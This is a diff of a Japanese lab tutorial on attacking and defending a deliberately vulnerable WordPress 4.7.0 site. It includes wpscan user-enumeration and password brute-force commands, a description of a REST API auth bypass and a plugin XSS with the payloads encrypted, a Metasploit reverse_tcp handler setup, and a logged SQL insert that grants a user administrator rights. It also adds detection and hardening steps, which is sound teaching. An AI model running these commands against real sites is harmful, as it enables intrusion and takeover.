@@ -57,11 +57,7 @@ systemctl enable httpd
 systemctl start httpd
 
 # テストページの設置
-cat > /var/www/html/index.php << END
-<?php
-phpinfo();
-?>
-END
+echo "<?php phpinfo(); ?>" > /var/www/html/index.php
 ```
 
 **ファイアウォール/SELinux**
@@ -120,7 +116,6 @@ echo 'show tables;'|mysql -u wpadmin -D wpdb -pwpadmin
 ## WordPress Core
 wordpress公式が古いバージョンのWordPressを配布しています。
 利用する脆弱性に応じたWordPressを取得してください。
-画像の例ではWordPress4.6.0を設置する手順を示していますが、後の検証をスムーズに進めるためにはWordPress4.7.0を設置する方が良いでしょう。
 
 ```
 # wordpressのダウンロードと設置
@@ -136,7 +131,6 @@ chown -R apache: /var/www/html/4.7.0
 ![](/images/wordpress/setup-config.png)
 
 MySQLに作成したデータベース名、ユーザー名、パスワードを指定します。
-画像の例ではテーブル接頭辞を`wp_46`としていますが、後の検証をスムーズに進めるためにはデフォルトの`wp_`で進めた方が良いでしょう。
 
 ![](/images/wordpress/setupconfig2.png)
 
@@ -160,9 +154,6 @@ echo "define('AUTOMATIC_UPDATER_DISABLED', true);" >> /var/www/html/4.7.0/wp-con
 ![](/images/wordpress/setupconfig4.png)
 
 サイトの情報を設定して`WordPressをインストール`をクリックすれば構築は完了です。
-
-![](/images/wordpress/installcomplete.png)
-
 Hello world!にアクセスできることを確認します。
 
 ![](/images/wordpress/wpindex.png)
@@ -228,13 +219,13 @@ WoredPress Coreのバージョンや使用されているPluginのバージョ�
 
 ```
 # 基本的な情報を列挙する
-wpscan -u http://target-server/wordpress-dir/
+wpscan --url http://172.16.0.254/4.7.0/ --wp-content-dir wp-content
 
 # ユーザーアカウントを列挙する
-wpscan -u http://target-server/wordpress-dir/ --enum users
+wpscan --url http://172.16.0.254/4.7.0/ --wp-content-dir wp-content --enumerate u
 
 # ユーザーアカウントを指定してパスワードリストの中から一致する物を全探索する
-wpscan -u http://target-server/wordpress-dir/ --username targetuser --wordlist passwordlist
+wpscan --url http://172.16.0.254/4.7.0/ --wp-content-dir wp-content --usernames wpuser --passwords /tmp/password
 ```
 
 ブルートフォースを行う際は、質の良いパスワードリストの入手が課題になります。
@@ -269,19 +260,12 @@ http://localhost/4.7.0/index.php/wp-json/wp/v2/posts/
 **REST APIの脆弱性**
 
 WordPress4.7.0のREST APIには認証バイパスの脆弱性があります。
-例えば以下のpythonコードはWordPress4.7.0のHello World!ページを書き換えます。
+例えば以下のPOSTリクエストはWordPress4.7.0のHello World!ページを書き換えます。
+[Fiddler](https://www.telerik.com/download/fiddler)等のローカルプロキシを使ってPOSTリクエストを送信してみましょう。
 
 悪用を防ぐためopenssl 1.0.2k-fips aes256で暗号化してあります。パスワードは弊社名の略称です。
 ```
-U2FsdGVkX19wksWBReZsgKq5X6nV2sbk904L/VszoUCFHPCwBxsDc1tHklTmVzLBPJjr2781u90SgiY9o5i4+wUYH0L/vE2B2MM1TVjauPij5NF+IJMzGru9kMhq2lzNJeL1TqKjM23/EzHK5piFXiAVCjy7lSsv3LhhQcmK4dPVf5cSrj7DTrMEBv3zUKCmjScEFOgtvHEefofMs4ZUJq/bi+htXZguLVy7ZBdDajKyY3EgBetvyHVjG+IIPhgh7YyCG6dYR8zsSc8UiMC+WsDZ5IluZNp1YsxPF4uv2PLDY+bVPupVP6tccdF3WeaoLVyG8yM+mLmT3nzXLxXQMa7CW20+8QQW8LNBlo00++uJa5MRkHZkwODanacT/E7o
-```
-
-[Fiddler](https://www.telerik.com/download/fiddler)等のローカルプロキシを使ってREST APIをコールする事も出来ます。
-送信するPOSTリクエストは以下の通りです。
-
-悪用を防ぐためopenssl 1.0.2k-fips aes256で暗号化してあります。パスワードは弊社名の略称です。
-```
-U2FsdGVkX19T2S9GM16Rn3P+PPFPGvIL+jolJnOxec9PRAVK/AdeJUax1l5d9k9knMAjAEEz5EXGx8hKSe6//dPLgatOTZ6wJsvu7jgIIiosS3NMZYftSMirq1unxlvg9SeSJGLiOeXCsv5khvfGjs5TszP+l4EJZrLOWytoahMjHZf46AxAhur/bjPDynNYLGQfVqNlDa+peF0L4r4YglusySAbY0FBnQR3t9nzNiXZ8dfK8rJJcWszvpoy7fPJ/IdGmtUaC04jNSJzYVD1Sw==
+U2FsdGVkX193yY0WXq/xfbjjLXY6fumwnxKRiYzQ7i3r+CX7aENXMdK52Z649OPddaaak/xbQKS7W8akxT6tdQ/jReGS8OVCuWFYM91iDh2fy8emdpBpGpM/kdrMRCbUpkMs1630RsWlS96QNJTiwVM6CL8RL4XlTDKlb7T6pj3z/S2mHghljWp73tBrKJfyGaZ7VMyxqNq80sbijplGXTe9tdsdPU6HM+n/ZCsNvcXvNS4MqG8P6709nGDaeEUIfmxzOUNJBulXChPCzhx1nQ==
 ```
 
 ![](/images/wordpress/fiddler02.png)
@@ -300,8 +284,9 @@ WordPressにはksesというセキュリティ機能が有り、XSSに繋がる�
 あなたはksesの影響を受けずにXSSが出来るような手段を必要としています。
 他に利用できる脆弱性は無いでしょうか？
 
-このセッションでは、あなたは敢えて脆弱性のあるPluginをWordPressにインストールしたはずです。
-意図したとおりに[Activity Log Plugin](https://ja.wordpress.org/plugins/aryo-activity-log/)がインストールされていれば次の攻撃を試す価値があります。
+このセッションでは、あなたはセキュリティ強化の一環としてActivity Logプラグインをインストールしたはずです。
+実はこのプラグインにはXSSの脆弱性である[CVE-2018-8729](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8729)があります。
+意図したとおりにActivity Log Pluginがインストールされていれば次の攻撃を試す価値があります。
 
 悪用を防ぐためopenssl 1.0.2k-fips aes256で暗号化してあります。パスワードは弊社名の略称です。
 
@@ -341,7 +326,7 @@ U2FsdGVkX1+Rh7jbi2fXs9n9B5JhXI6qy+M8rW0VhErb+AM8ZkAfh9AxkBkqBtCjjr+UNy7Hd9c0bQn2
 ```
 
 ただしActivity LogのExploitで注入できるスクリプトの長さは1件あたり55byte以下です。
-しかも一部の文字がサニタイズされるためXSSチートシート等を参照して対策をとる必要があります。
+しかもダブルクォーテーションなどの一部の文字がサニタイズされてしまいます。
 この制約下で攻撃を成功させるために次の戦術を採用することにしましょう。
 
 1. スクリプトを配布するためのWebサーバを用意する
@@ -416,11 +401,11 @@ Kali LinuxでMetasploitを使ってreverse_tcpを起動します。
 
 ```
 msfconsole
-msf > use exploit/multi/handler
-msf exploit(handler) > set payload php/meterpreter/reverse_tcp
-msf exploit(handler) > set LHOST 172.16.0.254
-msf exploit(handler) > set LPORT 4444
-msf exploit(handler) > exploit
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set LHOST 172.16.0.254
+set LPORT 4444
+exploit
 ```
 
 ![](/images/wordpress/reverse02.png)
@@ -438,7 +423,13 @@ Metasploitのコンソールを確認するとコネクトバックが成立し�
 
 # 検知と防衛
 
+WordPress Codexが提供する[Wiki](wpdocs.osdn.jp/WordPress_の安全性を高める)にセキュリティ向上のためのベストプラクティスがまとめられています。
+いくつかの防衛策を試してみましょう。
+
 ## httpd
+
+ブルートフォースや攻撃の試行錯誤により短時間でアクセスが集中することがあります。
+このような不審なアクセス記録をWebサーバのアクセスログから確認します。
 
 ```
 egrep wp-login.php /var/log/httpd/access_log
@@ -448,7 +439,44 @@ egrep wp-login.php /var/log/httpd/access_log
 10.0.2.2 - - [08/Nov/2018:22:31:39 +0900] "POST /4.7.0/wp-login.php HTTP/1.1" 200 3289 "-" "Fiddler"
 ```
 
+攻撃の糸口になるようなファイルへのアクセスを制限する事が出来ます。
+Filesタイプのdeny from allディレクティブを定義すれば、ローカルホスト以外のログイン試行を防ぐことが出来ます。
+
+```
+cat /var/www/html/4.7.0/.htaccess
+
+# BEGIN WordPress
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /4.7.0/
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /4.7.0/index.php [L]
+</IfModule>
+
+<Files ~ "^wp-login.php$">
+deny from all
+</Files>
+```
+
+# MySQL
+
+攻撃が上手くいかなかった場合にエラーが出力されることがあります。
+次のログにはテーブルの主キー制約に触れたためINSERTクエリが失敗したことが記録されています。
+これは既存データの有無を確認しなかった攻撃者のミスです。
+
+```
+egrep INSERT /var/log/httpd/error_log
+
+[Sat Nov 10 21:17:26.322692 2018] [:error] [pid 12148] [client 10.0.2.2:49708] WordPress \xe3\x83\x87\xe3\x83\xbc\xe3\x82\xbf\xe3\x83\x99\xe3\x83\xbc\xe3\x82\xb9\xe3\x82\xa8\xe3\x83\xa9\xe3\x83\xbc: Duplicate entry '9999' for key 'PRIMARY' for query INSERT INTO `wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (9999, 999, 'wp_capabilities', 'a:1:{s:13:\\"administrator\\";b:1;}') made by require('wp-blog-header.php'), require_once('wp-includes/template-loader.php'), include('/themes/twentyseventeen/index.php'), get_header, locate_template, load_template, require_once('/themes/twentyseventeen/header.php')
+```
+
 ## WordPressテンプレート
+
+テンプレートファイルの更新日時から改ざんを確認できることがあります。
+次の例では攻撃者が改ざんした404.phpとheader.phpの更新日時が最近のものに書き換わっていることが分かります。
+
 ```
 pwd
 /var/www/html/4.7.0/wp-content/themes/twentyseventeen
@@ -461,12 +489,22 @@ drwxr-xr-x. 5 apache apache     88 12月  7  2016 ..
 drwxr-xr-x. 5 apache apache   4096 12月  7  2016 .
 ```
 
+WordPressにはテンプレートの改ざんを防ぐためのオプションが用意されています。
+wp-config.phpにDISALLOW_FILE_MODSを追記することで、ダッシュボードからテーマを編集できなくなります。
+
+```
+echo "define('DISALLOW_FILE_MODS',true);" >> wp-config.php
+```
+
+![](/images/wordpress/security01.png)
+
 # まとめ
 
 このセッションを通じてあなたはWordPressでWebサイトを構築する最低限のノウハウを得ました。
-本番環境では更にセキュリティに気を配った構築と運用を心がける必要がありますが、検証環境としては足りるはずです。
-知識を得るだけでなく、積極的に検証することでノウハウを定着させてください。
+知識を得るだけで満足せず、積極的に検証を重ねてノウハウを定着させてください。
 
-あなたはサイバーキルチェーンの概念を知り、WordPressに対する具体的な攻撃手段の一部を知ることが出来ました。
-大いなる力には、大いなる責任が伴うことを忘れないでください。
-あなたはその知識と力を、サイバー空間の安全を守るために行使すべきです。
+あなたはサイバーキルチェーンの概念を知りWordPressに対する具体的な攻撃手段の一部を知ることが出来ました。
+ただし、大いなる力には、大いなる責任が伴うことを忘れないでください。
+
+あなたはWordPressに対する攻撃を防ぎ、万が一攻撃を受けたとしても検知する方法に触れました。
+ぜひその知識と力をサイバー空間の安全を守るために行使してください。
